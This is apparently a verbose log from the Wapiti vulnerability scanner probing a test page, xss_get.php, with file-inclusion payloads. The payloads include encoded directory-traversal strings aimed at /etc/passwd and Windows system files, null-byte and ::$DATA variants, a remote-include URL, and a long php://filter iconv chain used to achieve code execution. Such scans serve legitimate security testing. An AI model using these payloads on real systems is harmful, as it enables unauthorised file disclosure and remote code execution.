2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:50.936 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:50.944 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:50.951 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:50.959 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.966 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:51.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:51.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:51.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:51.032 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:51.039 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:51.046 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:51.052 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=file%3A%2F%2F%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:51.059 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
2024-03-20 16:49:51.065 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:51.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:51.078 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:51.084 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:51.092 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:51.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:51.104 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=xss_get.php&security_level=2
2024-03-20 16:49:51.111 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=xss_get.php%00&security_level=2
2024-03-20 16:49:51.117 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=xss_get.php%3A%3A%24DATA&security_level=2
2024-03-20 16:49:51.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
2024-03-20 16:49:51.133 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
2024-03-20 16:49:51.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd
2024-03-20 16:49:51.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd%00
2024-03-20 16:49:51.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fservices
2024-03-20 16:49:51.159 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fservices%00
2024-03-20 16:49:51.165 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
2024-03-20 16:49:51.173 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
2024-03-20 16:49:51.180 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
2024-03-20 16:49:51.186 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:51.193 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:51.200 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
2024-03-20 16:49:51.207 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
2024-03-20 16:49:51.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
2024-03-20 16:49:51.227 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:51.238 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:51.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:51.260 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:51.271 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:51.282 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:51.293 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:51.304 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:51.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:51.327 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:51.339 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:51.350 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:51.362 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
2024-03-20 16:49:51.375 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:51.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:51.401 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:51.412 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:51.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:51.433 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:51.444 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:51.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:51.465 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:51.476 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:51.486 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:51.497 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:51.508 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:51.519 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:51.527 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:51.533 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:51.540 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:51.547 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:51.553 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:51.561 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:51.567 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:51.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
